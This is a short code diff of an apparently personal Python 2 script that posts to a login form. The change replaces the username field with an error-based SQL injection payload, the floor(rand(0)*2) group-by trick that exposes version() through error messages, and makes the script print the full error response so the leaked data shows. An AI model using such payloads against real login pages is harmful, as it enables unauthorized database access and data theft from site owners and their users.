@@ -9,7 +9,7 @@ headers = {
 
 data = {
     '_token': 'XaWes4eXOqUlBXv4c5LtQuqqiwIQ4ZZLpg6HHHvE',
-    'username': "shinian' and (select * from information_schema)# ",
+    'username': "shinian' and (select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))) #",
     'password': ''
 }
 
@@ -23,10 +23,7 @@ def get_token():
         html_str = response_stream.read()
         print html_str
     except urllib2.HTTPError as err:
-        print err
-        print err.filename
-        for ele in err.readlines():
-            print ele
+        print ''.join(err.readlines())
 
 
 get_token()
